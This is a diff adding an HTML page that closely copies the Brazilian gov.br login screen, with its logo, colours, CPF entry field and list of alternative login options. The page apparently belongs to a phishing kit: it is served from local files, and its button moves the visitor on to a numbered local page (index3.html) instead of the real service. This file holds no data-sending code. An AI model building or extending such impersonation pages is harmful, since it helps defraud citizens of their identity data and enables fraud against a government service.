@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>Entrar com gov.br</title>
+
+  <!-- Fonte Roboto -->
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+
+
+
+  <link rel="icon" href="static/govbr.png" type="image/png" />
+
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      font-family: 'Roboto', Arial, sans-serif;
+      background: #fff;
+      color: #333;
+      touch-action: manipulation;
+      overscroll-behavior: none;
+    }
+
+.topbar {
+  background-color:#001F5C;
+  color: #fff;
+  padding: 16px;
+  display: flex;
+  align-items: center;
+  font-size: 20px;
+  font-weight: bold;
+  font-family: 'Roboto', Arial, sans-serif;
+}
+
+.back-arrow {
+  font-size: 25px;
+  margin-right: 12px;
+  cursor: pointer;
+}
+
+.title {
+  font-size: 16px;
+}
+
+
+
+
+
+ 
+
+    .container {
+      max-width: 400px;
+      margin: 0 auto;
+      padding: 24px;
+    }
+
+    .logo {
+      text-align: center;
+      font-weight: bold;
+      font-size: 24px;
+      color: #1351B4;
+      margin-bottom: 24px;
+    }
+
+    h1 {
+      font-size: 20px;
+      margin-bottom: 16px;
+      text-align: center;
+      font-weight: bold;
+    }
+
+    .subtitle {
+      font-size: 14px;
+      margin-bottom: 16px;
+      text-align: center;
+      font-weight: bold;
+    }
+
+    label {
+      display: block;
+      font-size: 14px;
+      margin-bottom: 8px;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      margin-bottom: 16px;
+    }
+
+    button {
+      width: 100%;
+      padding: 14px;
+      font-size: 16px;
+      background: #1351B4;
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background: #0d3c8a;
+    }
+
+.desc {
+  font-size: 14px;
+  text-align: center;
+  margin-top: 12px;
+}
+
+.options {
+  margin-top: 32px;
+  font-size: 14px;
+}
+
+.options-title {
+  font-weight: bold;
+  margin-bottom: 16px;
+}
+
+.option {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  margin-bottom: 12px;
+}
+
+.icon {
+  font-size: 18px;
+}
+
+
+    @media (max-width: 480px) {
+      .container {
+        padding: 16px;
+      }
+      h1 {
+        font-size: 18px;
+      }
+    }
+
+.govbr-logo {
+  font-size: 35px;
+  font-weight: bold;
+  font-family: 'Roboto', Arial, sans-serif;
+  margin: 5px 0;
+  text-align: left; /* alinhado à esquerda */
+}
+
+.govbr-logo .g,
+.govbr-logo .b {
+  color: #1351B4; /* azul gov.br */
+}
+
+.govbr-logo .o,
+.govbr-logo .r {
+  color: #FFD700; /* amarelo gov.br */
+}
+
+.govbr-logo .v {
+  color: #008000; /* verde gov.br */
+}
+
+.govbr-logo .dot {
+  color: #1351B4; /* azul gov.br */
+}
+
+h6 {
+  font-weight: normal;   /* sem bold */
+  font-size: 12px;       /* menor para caber na mesma linha */
+  margin: -10;             /* remove espaços extras */
+  display: inline;       /* faz ficar na mesma linha */
+}
+
+.bank-login,
+.option {
+  display: flex;
+  align-items: center;
+  gap: 6px;
+  font-size: 12px;
+  font-family: 'Roboto', Arial, sans-serif;
+  margin-bottom: 10px;
+}
+
+.icon {
+  font-size: 16px;
+}
+
+.icon.green {
+  color: #2E7D32; /* verde gov.br */
+}
+
+.icon.blue {
+  color: #1351B4; /* azul gov.br */
+}
+
+.text {
+  white-space: nowrap;
+}
+
+.badge {
+  background-color: #2E7D32;
+  color: white;
+  font-size: 10px;
+  font-weight: bold;
+  padding: 2px 6px;
+  border-radius: 4px;
+  margin-left: auto;
+  white-space: nowrap;
+}
+
+
+
+
+  </style>
+</head>
+<body>
+
+<div class="topbar">
+
+
+  <span class="back-arrow" onclick="history.back()">←</span>
+  <span class="title">ENTRAR COM GOV.BR</span>
+</div>
+
+
+  <div class="container">
+
+    
+
+
+<div class="govbr-logo">
+  <span class="g">g</span><span class="o">o</span><span class="v">v</span><span class="dot">.</span><span class="b">b</span><span class="r">r</span>
+</div>
+
+
+
+    <div class="subtitle">Identifique-se no gov.br com:</div>
+
+    <label for="cpf">📇 Número do CPF</label>
+    <h6> Digite seu CPF para Criar ou acessar sua conta conta gov.br</h6>
+    <br>
+    <br>
+     <label for="cpf">CPF</label>
+    <input type="text" id="cpf" placeholder="Digite seu CPF" />
+
+    <button class="btn" onclick="window.location.href='index3.html'">Continuar</button>
+<div class="desc">Clique para criar ou acessar sua conta gov.br</div>
+
+<div class="options">
+  <div class="options-title">Outras opções de identificação:</div>
+
+<div class="bank-login">
+  <span class="icon green">💵</span>
+  <span class="text">Login com seu banco</span>
+  <span class="badge">SUA CONTA SERÁ PRATA</span>
+</div>
+
+<div class="option">
+  <span class="icon blue">📱</span>
+  <span class="text">Seu aplicativo gov.br</span>
+</div>
+
+<div class="option">
+  <span class="icon blue">🔒</span>
+  <span class="text">Seu certificado digital</span>
+</div>
+
+<div class="option">
+  <span class="icon blue">☁️</span>
+  <span class="text">Seu certificado em nuvem</span>
+</div>
+
+
+
+  </div>
+</body>
+</html>
